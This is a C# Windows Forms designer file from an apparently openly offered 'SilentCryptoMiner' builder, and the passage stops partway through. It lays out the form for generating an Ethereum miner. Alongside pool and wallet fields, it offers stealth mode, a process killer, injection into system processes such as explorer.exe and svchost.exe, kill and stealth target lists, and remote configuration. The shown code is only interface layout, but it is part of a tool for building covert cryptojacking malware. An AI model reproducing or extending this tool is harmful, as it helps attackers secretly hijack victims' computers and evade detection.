using System;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace SilentCryptoMiner
{
    [DesignerGenerated()]
    public partial class MinerETH : Form
    {

        // Form overrides dispose to clean up the component list.
        [DebuggerNonUserCode()]
        protected override void Dispose(bool disposing)
        {
            try
            {
                if (disposing && components is object)
                {
                    components.Dispose();
                }
            }
            finally
            {
                base.Dispose(disposing);
            }
        }

        // Required by the Windows Form Designer
        private System.ComponentModel.IContainer components;

        // NOTE: The following procedure is required by the Windows Form Designer
        // It can be modified using the Windows Form Designer.  
        // Do not modify it using the code editor.
        [DebuggerStepThrough()]
        private void InitializeComponent()
        {
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(MinerETH));
            this.formMinerETH = new MephTheme();
            this.tabcontrolMinerETH = new MephTabcontrol();
            this.tabConnection = new System.Windows.Forms.TabPage();
            this.groupOptional = new MephGroupBox();
            this.labelMinerETHConnectionWorker = new System.Windows.Forms.Label();
            this.txtPoolPassowrd = new MephTextBox();
            this.labelMinerETHConnectionPassword = new System.Windows.Forms.Label();
            this.txtPoolWorker = new MephTextBox();
            this.txtPoolData = new MephTextBox();
            this.labelMinerETHConnectionExtra = new System.Windows.Forms.Label();
            this.groupRequired = new MephGroupBox();
            this.txtPoolURL = new MephTextBox();
            this.labelMinerETHConnectionWallet = new System.Windows.Forms.Label();
            this.txtPoolUsername = new MephTextBox();
            this.labelMinerETHConnectionPool = new System.Windows.Forms.Label();
            this.comboPoolScheme = new MephComboBox();
            this.labelMinerETHConnectionScheme = new System.Windows.Forms.Label();
            this.tabMining = new System.Windows.Forms.TabPage();
            this.labelMinerETHMiningProcessKiller = new System.Windows.Forms.Label();
            this.toggleProcessKiller = new MephToggleSwitch();
            this.labelMinerETHMiningAlgorithm = new System.Windows.Forms.Label();
            this.comboAlgorithm = new MephComboBox();
            this.comboIdleGPU = new MephComboBox();
            this.comboMaxGPU = new MephComboBox();
            this.labelMinerETHMiningIdleGPU = new System.Windows.Forms.Label();
            this.labelMinerETHMiningMaxGPU = new System.Windows.Forms.Label();
            this.labelMinerETHMiningInject = new System.Windows.Forms.Label();
            this.comboInjection = new MephComboBox();
            this.labelMinerETHMiningStealth = new System.Windows.Forms.Label();
            this.toggleStealth = new MephToggleSwitch();
            this.labelMinerETHMiningIdleMinutes = new System.Windows.Forms.Label();
            this.labelMinerETHMiningIdleWait = new System.Windows.Forms.Label();
            this.txtIdleWait = new MephTextBox();
            this.labelMinerETHMiningIdle = new System.Windows.Forms.Label();
            this.toggleIdle = new MephToggleSwitch();
            this.tabAdvanced = new System.Windows.Forms.TabPage();
            this.toggleStealthFullscreen = new MephToggleSwitch();
            this.labelMinerXMRAdvancedStealthFullscreen = new System.Windows.Forms.Label();
            this.chkAPI = new MephCheckBox();
            this.labelMinerETHAdvancedKillTargets = new System.Windows.Forms.Label();
            this.labelMinerETHAdvancedStealthTargets = new System.Windows.Forms.Label();
            this.chkAdvParam = new MephCheckBox();
            this.chkRemoteConfig = new MephCheckBox();
            this.txtAPI = new MephTextBox();
            this.txtKillTargets = new MephTextBox();
            this.txtStealthTargets = new MephTextBox();
            this.txtAdvParam = new MephTextBox();
            this.txtRemoteConfig = new MephTextBox();
            this.tabJSON = new System.Windows.Forms.TabPage();
            this.txtJSON = new MephTextBox();
            this.formMinerETH.SuspendLayout();
            this.tabcontrolMinerETH.SuspendLayout();
            this.tabConnection.SuspendLayout();
            this.groupOptional.SuspendLayout();
            this.groupRequired.SuspendLayout();
            this.tabMining.SuspendLayout();
            this.tabAdvanced.SuspendLayout();
            this.tabJSON.SuspendLayout();
            this.SuspendLayout();
            // 
            // formMinerETH
            // 
            this.formMinerETH.AccentColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(192)))), ((int)(((byte)(0)))));
            this.formMinerETH.Anchor = System.Windows.Forms.AnchorStyles.None;
            this.formMinerETH.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(28)))), ((int)(((byte)(28)))), ((int)(((byte)(28)))));
            this.formMinerETH.Controls.Add(this.tabcontrolMinerETH);
            this.formMinerETH.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.formMinerETH.ForeColor = System.Drawing.Color.Gray;
            this.formMinerETH.Location = new System.Drawing.Point(0, 0);
            this.formMinerETH.Margin = new System.Windows.Forms.Padding(2);
            this.formMinerETH.MaximumSize = new System.Drawing.Size(535, 272);
            this.formMinerETH.MinimumSize = new System.Drawing.Size(535, 272);
            this.formMinerETH.Name = "formMinerETH";
            this.formMinerETH.Size = new System.Drawing.Size(535, 272);
            this.formMinerETH.SubHeader = "Create a new miner (ethminer)";
            this.formMinerETH.TabIndex = 0;
            this.formMinerETH.Text = "Create New Miner";
            // 
            // tabcontrolMinerETH
            // 
            this.tabcontrolMinerETH.Alignment = System.Windows.Forms.TabAlignment.Left;
            this.tabcontrolMinerETH.Anchor = System.Windows.Forms.AnchorStyles.None;
            this.tabcontrolMinerETH.Controls.Add(this.tabConnection);
            this.tabcontrolMinerETH.Controls.Add(this.tabMining);
            this.tabcontrolMinerETH.Controls.Add(this.tabAdvanced);
            this.tabcontrolMinerETH.Controls.Add(this.tabJSON);
            this.tabcontrolMinerETH.Font = new System.Drawing.Font("Segoe UI", 9.5F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(128)));
            this.tabcontrolMinerETH.ItemSize = new System.Drawing.Size(32, 85);
            this.tabcontrolMinerETH.Location = new System.Drawing.Point(12, 65);
            this.tabcontrolMinerETH.Multiline = true;
            this.tabcontrolMinerETH.Name = "tabcontrolMinerETH";
            this.tabcontrolMinerETH.SelectedIndex = 0;
            this.tabcontrolMinerETH.Size = new System.Drawing.Size(511, 197);
            this.tabcontrolMinerETH.SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
            this.tabcontrolMinerETH.TabIndex = 17;
            this.tabcontrolMinerETH.SelectedIndexChanged += new System.EventHandler(this.tabcontrolMinerETH_SelectedIndexChanged);
            // 
            // tabConnection
            // 
            this.tabConnection.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.tabConnection.Controls.Add(this.groupOptional);
            this.tabConnection.Controls.Add(this.groupRequired);
            this.tabConnection.Location = new System.Drawing.Point(89, 4);
            this.tabConnection.Name = "tabConnection";
            this.tabConnection.Size = new System.Drawing.Size(418, 189);
            this.tabConnection.TabIndex = 0;
            this.tabConnection.Text = "Connection";
            // 
            // groupOptional
            // 
            this.groupOptional.BackColor = System.Drawing.Color.Transparent;
            this.groupOptional.Controls.Add(this.labelMinerETHConnectionWorker);
            this.groupOptional.Controls.Add(this.txtPoolPassowrd);
            this.groupOptional.Controls.Add(this.labelMinerETHConnectionPassword);
            this.groupOptional.Controls.Add(this.txtPoolWorker);
            this.groupOptional.Controls.Add(this.txtPoolData);
            this.groupOptional.Controls.Add(this.labelMinerETHConnectionExtra);
            this.groupOptional.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.groupOptional.Header_Line = MephGroupBox.HeaderLine.Enabled;
            this.groupOptional.Location = new System.Drawing.Point(213, 3);
            this.groupOptional.Name = "groupOptional";
            this.groupOptional.Size = new System.Drawing.Size(202, 183);
            this.groupOptional.TabIndex = 50;
            this.groupOptional.Text = "Optional Settings";
            // 
            // labelMinerETHConnectionWorker
            // 
            this.labelMinerETHConnectionWorker.AutoSize = true;
            this.labelMinerETHConnectionWorker.Location = new System.Drawing.Point(10, 35);
            this.labelMinerETHConnectionWorker.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerETHConnectionWorker.Name = "labelMinerETHConnectionWorker";
            this.labelMinerETHConnectionWorker.Size = new System.Drawing.Size(92, 17);
            this.labelMinerETHConnectionWorker.TabIndex = 47;
            this.labelMinerETHConnectionWorker.Text = "Worker Name:";
            // 
            // txtPoolPassowrd
            // 
            this.txtPoolPassowrd.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtPoolPassowrd.ForeColor = System.Drawing.Color.Silver;
            this.txtPoolPassowrd.Location = new System.Drawing.Point(13, 101);
            this.txtPoolPassowrd.Margin = new System.Windows.Forms.Padding(2);
            this.txtPoolPassowrd.MaxLength = 32767;
            this.txtPoolPassowrd.MultiLine = false;
            this.txtPoolPassowrd.Name = "txtPoolPassowrd";
            this.txtPoolPassowrd.Size = new System.Drawing.Size(179, 24);
            this.txtPoolPassowrd.TabIndex = 12;
            this.txtPoolPassowrd.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtPoolPassowrd.UseSystemPasswordChar = false;
            this.txtPoolPassowrd.WordWrap = false;
            // 
            // labelMinerETHConnectionPassword
            // 
            this.labelMinerETHConnectionPassword.AutoSize = true;
            this.labelMinerETHConnectionPassword.Location = new System.Drawing.Point(10, 82);
            this.labelMinerETHConnectionPassword.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerETHConnectionPassword.Name = "labelMinerETHConnectionPassword";
            this.labelMinerETHConnectionPassword.Size = new System.Drawing.Size(67, 17);
            this.labelMinerETHConnectionPassword.TabIndex = 13;
            this.labelMinerETHConnectionPassword.Text = "Password:";
            // 
            // txtPoolWorker
            // 
            this.txtPoolWorker.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtPoolWorker.ForeColor = System.Drawing.Color.Silver;
            this.txtPoolWorker.Location = new System.Drawing.Point(13, 54);
            this.txtPoolWorker.Margin = new System.Windows.Forms.Padding(2);
            this.txtPoolWorker.MaxLength = 32767;
            this.txtPoolWorker.MultiLine = false;
            this.txtPoolWorker.Name = "txtPoolWorker";
            this.txtPoolWorker.Size = new System.Drawing.Size(179, 24);
            this.txtPoolWorker.TabIndex = 46;
            this.txtPoolWorker.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtPoolWorker.UseSystemPasswordChar = false;
            this.txtPoolWorker.WordWrap = false;
            // 
            // txtPoolData
            // 
            this.txtPoolData.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtPoolData.ForeColor = System.Drawing.Color.Silver;
            this.txtPoolData.Location = new System.Drawing.Point(13, 147);
            this.txtPoolData.Margin = new System.Windows.Forms.Padding(2);
            this.txtPoolData.MaxLength = 32767;
            this.txtPoolData.MultiLine = false;
            this.txtPoolData.Name = "txtPoolData";
            this.txtPoolData.Size = new System.Drawing.Size(179, 24);
            this.txtPoolData.TabIndex = 43;
            this.txtPoolData.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtPoolData.UseSystemPasswordChar = false;
            this.txtPoolData.WordWrap = false;
            // 
            // labelMinerETHConnectionExtra
            // 
            this.labelMinerETHConnectionExtra.AutoSize = true;
            this.labelMinerETHConnectionExtra.Location = new System.Drawing.Point(11, 127);
            this.labelMinerETHConnectionExtra.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerETHConnectionExtra.Name = "labelMinerETHConnectionExtra";
            this.labelMinerETHConnectionExtra.Size = new System.Drawing.Size(70, 17);
            this.labelMinerETHConnectionExtra.TabIndex = 44;
            this.labelMinerETHConnectionExtra.Text = "Extra data:";
            // 
            // groupRequired
            // 
            this.groupRequired.BackColor = System.Drawing.Color.Transparent;
            this.groupRequired.Controls.Add(this.txtPoolURL);
            this.groupRequired.Controls.Add(this.labelMinerETHConnectionWallet);
            this.groupRequired.Controls.Add(this.txtPoolUsername);
            this.groupRequired.Controls.Add(this.labelMinerETHConnectionPool);
            this.groupRequired.Controls.Add(this.comboPoolScheme);
            this.groupRequired.Controls.Add(this.labelMinerETHConnectionScheme);
            this.groupRequired.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.groupRequired.Header_Line = MephGroupBox.HeaderLine.Enabled;
            this.groupRequired.Location = new System.Drawing.Point(5, 3);
            this.groupRequired.Name = "groupRequired";
            this.groupRequired.Size = new System.Drawing.Size(202, 183);
            this.groupRequired.TabIndex = 49;
            this.groupRequired.Text = "Required Settings";
            // 
            // txtPoolURL
            // 
            this.txtPoolURL.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtPoolURL.ForeColor = System.Drawing.Color.Silver;
            this.txtPoolURL.Location = new System.Drawing.Point(8, 101);
            this.txtPoolURL.Margin = new System.Windows.Forms.Padding(2);
            this.txtPoolURL.MaxLength = 32767;
            this.txtPoolURL.MultiLine = false;
            this.txtPoolURL.Name = "txtPoolURL";
            this.txtPoolURL.Size = new System.Drawing.Size(179, 24);
            this.txtPoolURL.TabIndex = 14;
            this.txtPoolURL.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtPoolURL.UseSystemPasswordChar = false;
            this.txtPoolURL.WordWrap = false;
            // 
            // labelMinerETHConnectionWallet
            // 
            this.labelMinerETHConnectionWallet.AutoSize = true;
            this.labelMinerETHConnectionWallet.Location = new System.Drawing.Point(6, 128);
            this.labelMinerETHConnectionWallet.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerETHConnectionWallet.Name = "labelMinerETHConnectionWallet";
            this.labelMinerETHConnectionWallet.Size = new System.Drawing.Size(98, 17);
            this.labelMinerETHConnectionWallet.TabIndex = 11;
            this.labelMinerETHConnectionWallet.Text = "Wallet Address:";
            // 
            // txtPoolUsername
            // 
            this.txtPoolUsername.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtPoolUsername.ForeColor = System.Drawing.Color.Silver;
            this.txtPoolUsername.Location = new System.Drawing.Point(9, 147);
            this.txtPoolUsername.Margin = new System.Windows.Forms.Padding(2);
            this.txtPoolUsername.MaxLength = 32767;
            this.txtPoolUsername.MultiLine = false;
            this.txtPoolUsername.Name = "txtPoolUsername";
            this.txtPoolUsername.Size = new System.Drawing.Size(179, 24);
            this.txtPoolUsername.TabIndex = 10;
            this.txtPoolUsername.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtPoolUsername.UseSystemPasswordChar = false;
            this.txtPoolUsername.WordWrap = false;
            // 
            // labelMinerETHConnectionPool
            // 
            this.labelMinerETHConnectionPool.AutoSize = true;
            this.labelMinerETHConnectionPool.Location = new System.Drawing.Point(6, 82);
            this.labelMinerETHConnectionPool.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerETHConnectionPool.Name = "labelMinerETHConnectionPool";
            this.labelMinerETHConnectionPool.Size = new System.Drawing.Size(37, 17);
            this.labelMinerETHConnectionPool.TabIndex = 15;
            this.labelMinerETHConnectionPool.Text = "Pool:";
            // 
            // comboPoolScheme
            // 
            this.comboPoolScheme.BackColor = System.Drawing.Color.Transparent;
            this.comboPoolScheme.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.comboPoolScheme.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboPoolScheme.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.comboPoolScheme.ForeColor = System.Drawing.Color.Silver;
            this.comboPoolScheme.FormattingEnabled = true;
            this.comboPoolScheme.ItemHeight = 16;
            this.comboPoolScheme.ItemHighlightColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(55)))), ((int)(((byte)(55)))));
            this.comboPoolScheme.Items.AddRange(new object[] {
            "stratum (Standard)",
            "stratums (SSL/TLS)",
            "stratumss (SSL/TLS 1.2)",
            "http (getwork, proxy)"});
            this.comboPoolScheme.Location = new System.Drawing.Point(8, 56);
            this.comboPoolScheme.Margin = new System.Windows.Forms.Padding(2);
            this.comboPoolScheme.Name = "comboPoolScheme";
            this.comboPoolScheme.Size = new System.Drawing.Size(179, 22);
            this.comboPoolScheme.StartIndex = 0;
            this.comboPoolScheme.TabIndex = 40;
            // 
            // labelMinerETHConnectionScheme
            // 
            this.labelMinerETHConnectionScheme.AutoSize = true;
            this.labelMinerETHConnectionScheme.Location = new System.Drawing.Point(5, 36);
            this.labelMinerETHConnectionScheme.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerETHConnectionScheme.Name = "labelMinerETHConnectionScheme";
            this.labelMinerETHConnectionScheme.Size = new System.Drawing.Size(125, 17);
            this.labelMinerETHConnectionScheme.TabIndex = 41;
            this.labelMinerETHConnectionScheme.Text = "Connection Scheme:";
            // 
            // tabMining
            // 
            this.tabMining.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.tabMining.Controls.Add(this.labelMinerETHMiningProcessKiller);
            this.tabMining.Controls.Add(this.toggleProcessKiller);
            this.tabMining.Controls.Add(this.labelMinerETHMiningAlgorithm);
            this.tabMining.Controls.Add(this.comboAlgorithm);
            this.tabMining.Controls.Add(this.comboIdleGPU);
            this.tabMining.Controls.Add(this.comboMaxGPU);
            this.tabMining.Controls.Add(this.labelMinerETHMiningIdleGPU);
            this.tabMining.Controls.Add(this.labelMinerETHMiningMaxGPU);
            this.tabMining.Controls.Add(this.labelMinerETHMiningInject);
            this.tabMining.Controls.Add(this.comboInjection);
            this.tabMining.Controls.Add(this.labelMinerETHMiningStealth);
            this.tabMining.Controls.Add(this.toggleStealth);
            this.tabMining.Controls.Add(this.labelMinerETHMiningIdleMinutes);
            this.tabMining.Controls.Add(this.labelMinerETHMiningIdleWait);
            this.tabMining.Controls.Add(this.txtIdleWait);
            this.tabMining.Controls.Add(this.labelMinerETHMiningIdle);
            this.tabMining.Controls.Add(this.toggleIdle);
            this.tabMining.Location = new System.Drawing.Point(89, 4);
            this.tabMining.Name = "tabMining";
            this.tabMining.Padding = new System.Windows.Forms.Padding(3);
            this.tabMining.Size = new System.Drawing.Size(418, 189);
            this.tabMining.TabIndex = 5;
            this.tabMining.Text = "Mining";
            // 
            // labelMinerETHMiningProcessKiller
            // 
            this.labelMinerETHMiningProcessKiller.AutoSize = true;
            this.labelMinerETHMiningProcessKiller.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelMinerETHMiningProcessKiller.Location = new System.Drawing.Point(10, 42);
            this.labelMinerETHMiningProcessKiller.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerETHMiningProcessKiller.Name = "labelMinerETHMiningProcessKiller";
            this.labelMinerETHMiningProcessKiller.Size = new System.Drawing.Size(89, 17);
            this.labelMinerETHMiningProcessKiller.TabIndex = 141;
            this.labelMinerETHMiningProcessKiller.Text = "Process Killer:";
            // 
            // toggleProcessKiller
            // 
            this.toggleProcessKiller.BackColor = System.Drawing.Color.Transparent;
            this.toggleProcessKiller.Checked = false;
            this.toggleProcessKiller.ForeColor = System.Drawing.Color.Black;
            this.toggleProcessKiller.Location = new System.Drawing.Point(111, 38);
            this.toggleProcessKiller.Margin = new System.Windows.Forms.Padding(2);
            this.toggleProcessKiller.Name = "toggleProcessKiller";
            this.toggleProcessKiller.Size = new System.Drawing.Size(50, 24);
            this.toggleProcessKiller.TabIndex = 140;
            // 
            // labelMinerETHMiningAlgorithm
            // 
            this.labelMinerETHMiningAlgorithm.AutoSize = true;
            this.labelMinerETHMiningAlgorithm.Location = new System.Drawing.Point(253, 140);
            this.labelMinerETHMiningAlgorithm.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerETHMiningAlgorithm.Name = "labelMinerETHMiningAlgorithm";
            this.labelMinerETHMiningAlgorithm.Size = new System.Drawing.Size(68, 17);
            this.labelMinerETHMiningAlgorithm.TabIndex = 68;
            this.labelMinerETHMiningAlgorithm.Text = "Algorithm:";
            // 
            // comboAlgorithm
            // 
            this.comboAlgorithm.BackColor = System.Drawing.Color.Transparent;
            this.comboAlgorithm.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.comboAlgorithm.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboAlgorithm.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.comboAlgorithm.ForeColor = System.Drawing.Color.Silver;
            this.comboAlgorithm.FormattingEnabled = true;
            this.comboAlgorithm.ItemHeight = 16;
            this.comboAlgorithm.ItemHighlightColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(55)))), ((int)(((byte)(55)))));
            this.comboAlgorithm.Items.AddRange(new object[] {
            "ethash",
            "etchash",
            "ubqhash"});
            this.comboAlgorithm.Location = new System.Drawing.Point(256, 159);
            this.comboAlgorithm.Margin = new System.Windows.Forms.Padding(2);
            this.comboAlgorithm.Name = "comboAlgorithm";
            this.comboAlgorithm.Size = new System.Drawing.Size(147, 22);
            this.comboAlgorithm.StartIndex = 0;
            this.comboAlgorithm.TabIndex = 67;
            this.comboAlgorithm.SelectedIndexChanged += new System.EventHandler(this.comboAlgorithm_SelectedIndexChanged);
            // 
            // comboIdleGPU
            // 
            this.comboIdleGPU.BackColor = System.Drawing.Color.Transparent;
            this.comboIdleGPU.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.comboIdleGPU.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboIdleGPU.Font = new System.Drawing.Font("Verdana", 8F);
            this.comboIdleGPU.ForeColor = System.Drawing.Color.Silver;
            this.comboIdleGPU.FormattingEnabled = true;
            this.comboIdleGPU.ItemHeight = 16;
            this.comboIdleGPU.ItemHighlightColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(55)))), ((int)(((byte)(55)))));
            this.comboIdleGPU.Items.AddRange(new object[] {
            "0%",
            "10%",
            "20%",
            "30%",
            "40%",
            "50%",
            "60%",
            "70%",
            "80%",
            "90%",
            "100%"});
            this.comboIdleGPU.Location = new System.Drawing.Point(346, 70);
            this.comboIdleGPU.Name = "comboIdleGPU";
            this.comboIdleGPU.Size = new System.Drawing.Size(60, 22);
            this.comboIdleGPU.StartIndex = 10;
            this.comboIdleGPU.TabIndex = 66;
            // 
            // comboMaxGPU
            // 
            this.comboMaxGPU.BackColor = System.Drawing.Color.Transparent;
            this.comboMaxGPU.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.comboMaxGPU.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboMaxGPU.Font = new System.Drawing.Font("Verdana", 8F);
            this.comboMaxGPU.ForeColor = System.Drawing.Color.Silver;
            this.comboMaxGPU.FormattingEnabled = true;
            this.comboMaxGPU.ItemHeight = 16;
            this.comboMaxGPU.ItemHighlightColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(55)))), ((int)(((byte)(55)))));
            this.comboMaxGPU.Items.AddRange(new object[] {
            "0%",
            "10%",
            "20%",
            "30%",
            "40%",
            "50%",
            "60%",
            "70%",
            "80%",
            "90%",
            "100%"});
            this.comboMaxGPU.Location = new System.Drawing.Point(346, 40);
            this.comboMaxGPU.Name = "comboMaxGPU";
            this.comboMaxGPU.Size = new System.Drawing.Size(60, 22);
            this.comboMaxGPU.StartIndex = 10;
            this.comboMaxGPU.TabIndex = 65;
            // 
            // labelMinerETHMiningIdleGPU
            // 
            this.labelMinerETHMiningIdleGPU.AutoSize = true;
            this.labelMinerETHMiningIdleGPU.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelMinerETHMiningIdleGPU.Location = new System.Drawing.Point(256, 72);
            this.labelMinerETHMiningIdleGPU.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerETHMiningIdleGPU.Name = "labelMinerETHMiningIdleGPU";
            this.labelMinerETHMiningIdleGPU.Size = new System.Drawing.Size(61, 17);
            this.labelMinerETHMiningIdleGPU.TabIndex = 63;
            this.labelMinerETHMiningIdleGPU.Text = "Idle GPU:";
            // 
            // labelMinerETHMiningMaxGPU
            // 
            this.labelMinerETHMiningMaxGPU.AutoSize = true;
            this.labelMinerETHMiningMaxGPU.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelMinerETHMiningMaxGPU.Location = new System.Drawing.Point(256, 41);
            this.labelMinerETHMiningMaxGPU.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerETHMiningMaxGPU.Name = "labelMinerETHMiningMaxGPU";
            this.labelMinerETHMiningMaxGPU.Size = new System.Drawing.Size(65, 17);
            this.labelMinerETHMiningMaxGPU.TabIndex = 61;
            this.labelMinerETHMiningMaxGPU.Text = "Max GPU:";
            // 
            // labelMinerETHMiningInject
            // 
            this.labelMinerETHMiningInject.AutoSize = true;
            this.labelMinerETHMiningInject.Location = new System.Drawing.Point(10, 140);
            this.labelMinerETHMiningInject.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerETHMiningInject.Name = "labelMinerETHMiningInject";
            this.labelMinerETHMiningInject.Size = new System.Drawing.Size(67, 17);
            this.labelMinerETHMiningInject.TabIndex = 59;
            this.labelMinerETHMiningInject.Text = "Inject Into:";
            // 
            // comboInjection
            // 
            this.comboInjection.BackColor = System.Drawing.Color.Transparent;
            this.comboInjection.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.comboInjection.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboInjection.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.comboInjection.ForeColor = System.Drawing.Color.Silver;
            this.comboInjection.FormattingEnabled = true;
            this.comboInjection.ItemHeight = 16;
            this.comboInjection.ItemHighlightColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(55)))), ((int)(((byte)(55)))));
            this.comboInjection.Items.AddRange(new object[] {
            "explorer.exe",
            "nslookup.exe",
            "cmd.exe",
            "notepad.exe",
            "svchost.exe",
            "conhost.exe"});
            this.comboInjection.Location = new System.Drawing.Point(13, 159);
            this.comboInjection.Margin = new System.Windows.Forms.Padding(2);
            this.comboInjection.Name = "comboInjection";
            this.comboInjection.Size = new System.Drawing.Size(148, 22);
            this.comboInjection.StartIndex = 0;
            this.comboInjection.TabIndex = 58;
            // 
            // labelMinerETHMiningStealth
            // 
            this.labelMinerETHMiningStealth.AutoSize = true;
            this.labelMinerETHMiningStealth.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelMinerETHMiningStealth.Location = new System.Drawing.Point(10, 16);
            this.labelMinerETHMiningStealth.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerETHMiningStealth.Name = "labelMinerETHMiningStealth";
            this.labelMinerETHMiningStealth.Size = new System.Drawing.Size(50, 17);
            this.labelMinerETHMiningStealth.TabIndex = 56;
            this.labelMinerETHMiningStealth.Text = "Stealth:";
            // 
            // toggleStealth
            // 
            this.toggleStealth.BackColor = System.Drawing.Color.Transparent;
            this.toggleStealth.Checked = false;
            this.toggleStealth.ForeColor = System.Drawing.Color.Black;
            this.toggleStealth.Location = new System.Drawing.Point(111, 11);
            this.toggleStealth.Margin = new System.Windows.Forms.Padding(2);
            this.toggleStealth.Name = "toggleStealth";
            this.toggleStealth.Size = new System.Drawing.Size(50, 24);
            this.toggleStealth.TabIndex = 55;
            // 
            // labelMinerETHMiningIdleMinutes
            // 
            this.labelMinerETHMiningIdleMinutes.AutoSize = true;
            this.labelMinerETHMiningIdleMinutes.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelMinerETHMiningIdleMinutes.Location = new System.Drawing.Point(357, 101);
            this.labelMinerETHMiningIdleMinutes.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerETHMiningIdleMinutes.Name = "labelMinerETHMiningIdleMinutes";
            this.labelMinerETHMiningIdleMinutes.Size = new System.Drawing.Size(54, 17);
            this.labelMinerETHMiningIdleMinutes.TabIndex = 53;
            this.labelMinerETHMiningIdleMinutes.Text = "Minutes";
            // 
            // labelMinerETHMiningIdleWait
            // 
            this.labelMinerETHMiningIdleWait.AutoSize = true;
            this.labelMinerETHMiningIdleWait.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelMinerETHMiningIdleWait.Location = new System.Drawing.Point(256, 101);
            this.labelMinerETHMiningIdleWait.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerETHMiningIdleWait.Name = "labelMinerETHMiningIdleWait";
            this.labelMinerETHMiningIdleWait.Size = new System.Drawing.Size(61, 17);
            this.labelMinerETHMiningIdleWait.TabIndex = 52;
            this.labelMinerETHMiningIdleWait.Text = "Idle Wait:";
            // 
            // txtIdleWait
            // 
            this.txtIdleWait.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtIdleWait.Enabled = false;
            this.txtIdleWait.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.txtIdleWait.ForeColor = System.Drawing.Color.Silver;
            this.txtIdleWait.Location = new System.Drawing.Point(331, 99);
            this.txtIdleWait.MaxLength = 32767;
            this.txtIdleWait.MultiLine = false;
            this.txtIdleWait.Name = "txtIdleWait";
            this.txtIdleWait.Size = new System.Drawing.Size(24, 24);
            this.txtIdleWait.TabIndex = 51;
            this.txtIdleWait.Text = "5";
